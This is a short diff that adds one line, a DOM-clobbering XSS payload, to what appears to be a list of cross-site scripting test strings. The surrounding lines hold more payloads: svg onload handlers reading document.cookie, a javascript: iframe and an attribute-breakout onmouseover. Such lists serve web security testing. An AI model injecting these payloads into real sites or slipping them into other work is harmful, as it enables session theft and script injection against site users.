@@ -49,6 +49,7 @@ http://foo?&apos;-alert(1)-&apos;
 ||||||||||||||||||||||||||||||||||||||||||||||||||||||
 for testing =====>
 <iframe src="javascript:alert('xss');" >
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
 "><svg onload=alert(document.cookie);>
 <svg onload=alert(document.cookie);>
 "onmouseover="alert('xss')
